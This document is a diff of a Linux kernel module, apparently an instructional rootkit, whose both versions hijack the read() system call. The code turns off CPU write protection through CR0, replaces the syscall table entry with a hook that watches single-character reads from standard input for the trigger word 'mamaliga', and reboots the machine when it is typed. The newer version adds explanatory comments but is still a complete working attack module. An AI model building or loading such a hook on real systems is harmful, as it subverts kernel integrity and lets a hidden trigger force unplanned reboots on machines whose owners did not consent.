@@ -1,28 +1,26 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <linux/delay.h>
-#include <linux/reboot.h>
-#include <asm/paravirt.h>
+#include <linux/module.h>   /* Needed by all modules */
+#include <linux/unistd.h>   /* Needed for __NR_read */
+#include <linux/reboot.h>   /* Needed for kernel_restart() */
+#include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */
 
 #define MAGIC "mamaliga"
-#define SIZEOF_MAGIC 7
+#define SIZEOF_MAGIC 8
 
-unsigned long **sys_call_table;
-unsigned long original_cr0;
+void **sys_call_table;
+asmlinkage long (*read_syscall_ref)(unsigned int fd, char __user *buf, size_t count);
 int pos;
 
-asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
-asmlinkage long my_sys_read(unsigned int fd, char __user *buf, size_t count)
+asmlinkage long my_read_syscall_ref(unsigned int fd, char __user *buf, size_t count)
 {
 	long ret;
 	int i;
-	ret = ref_sys_read(fd, buf, count);
 
-	if(count != 1 || fd != 0)
+	ret = read_syscall_ref(fd, buf, count);
+
+	if (count != 1 || fd != 0)
 		return ret;
 
-	/* The magic command is partial, prind what was written so far */
+	/* The magic command is partial, print what was written so far */
 	if (MAGIC[pos] != buf[0]) {
 		for (i = 0; i < pos; ++i)
 			printk(KERN_INFO "Found: %c", MAGIC[i]);
@@ -32,59 +30,70 @@ asmlinkage long my_sys_read(unsigned int fd, char __user *buf, size_t count)
 		return ret;
 	}
 
-	++pos;
-	if (SIZEOF_MAGIC < pos) {
-		printk(KERN_INFO "MWAHAHAHAAHAH");
+	pos++;
+	if (SIZEOF_MAGIC-1 < pos) {
+		printk(KERN_INFO "Mouaxaxaxaxaxa!");
 		kernel_restart(NULL);
 	}
 
 	return ret;
 }
 
-static unsigned long **aquire_sys_call_table(void)
+
+/* Initialization function which is called when the module is
+   insmoded into the kernel. It replaces the read() syscall. */
+static int __init interceptor_start(void)
 {
-	unsigned long int offset = PAGE_OFFSET;
-	unsigned long **sct;
+	unsigned long original_cr0;
 
-	while (offset < ULLONG_MAX) {
-		sct = (unsigned long **)offset;
-
-		if (sct[__NR_close] == (unsigned long *) sys_close) 
-			return sct;
-
-		offset += sizeof(void *);
-	}
-	
-	return NULL;
-}
-
-static int __init interceptor_start(void) 
-{
-	if(!(sys_call_table = aquire_sys_call_table()))
-		return -1;
-	
+    /* Reading contents of control register cr0. The cr0 register has various
+       control flags that modify the basic operation of the processor. */
 	original_cr0 = read_cr0();
 
+    /* Disable `write-protect` mode. Do so by setting the WP (Write protect)
+       bit to 0. When set to 1, the CPU can't write to read-only pages */
 	write_cr0(original_cr0 & ~0x00010000);
-	ref_sys_read = (void *)sys_call_table[__NR_read];
-	sys_call_table[__NR_read] = (unsigned long *)my_sys_read;
+
+    /* Store original read() syscall */
+	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
+	read_syscall_ref = (void *) sys_call_table[__NR_read];
+
+    /* Replace in the system call table the original
+       read() syscall with our intercepting function */
+	sys_call_table[__NR_read] = (unsigned long *) my_read_syscall_ref;
+
+    /* Enable `write-protect` mode */
 	write_cr0(original_cr0);
-	
+
+	printk(KERN_INFO "%s\n", "Hello");
+
+    /* A non 0 return value means init_module failed; module can't be loaded */
 	return 0;
 }
 
-static void __exit interceptor_end(void) 
+
+/* Cleanup function which is called just before module
+   is rmmoded. It restores the original read() syscall. */
+static void __exit interceptor_end(void)
 {
-	if(!sys_call_table) {
-		return;
-	}
-	
+    /* Reading contents of control register cr0. The cr0 register has various
+       control flags that modify the basic operation of the processor. */
+	unsigned long original_cr0 = read_cr0();
+
+    /* Disable `write-protect` mode */
 	write_cr0(original_cr0 & ~0x00010000);
-	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
+
+    /* Restores original read() syscall */
+	sys_call_table[__NR_read] = (unsigned long *) read_syscall_ref;
+
+    /* Enable `write-protect` mode */
 	write_cr0(original_cr0);
-	
-	msleep(2000);
+
+	printk(KERN_INFO "%s\n", "Bye bye");
+
+	return;
 }
+
 
 module_init(interceptor_start);
 module_exit(interceptor_end);
